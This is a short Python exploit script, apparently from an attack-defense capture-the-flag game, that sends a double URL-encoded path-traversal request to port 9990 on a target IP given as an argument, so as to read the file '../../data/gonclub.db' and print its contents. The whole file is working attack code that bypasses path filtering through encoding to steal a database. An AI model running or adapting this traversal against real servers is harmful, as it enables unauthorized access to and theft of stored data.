#!/usr/bin/env python3
import requests
import sys

def url_encode(url):
    out = ''
    for c in url:
        out += '%' + hex(ord(c))[2:].zfill(2)
    return out

ip = sys.argv[1]

r = requests.get('http://' + ip + ':9990' + '/' + url_encode(url_encode('../../data/gonclub.db')))

print(r.text, flush=True)
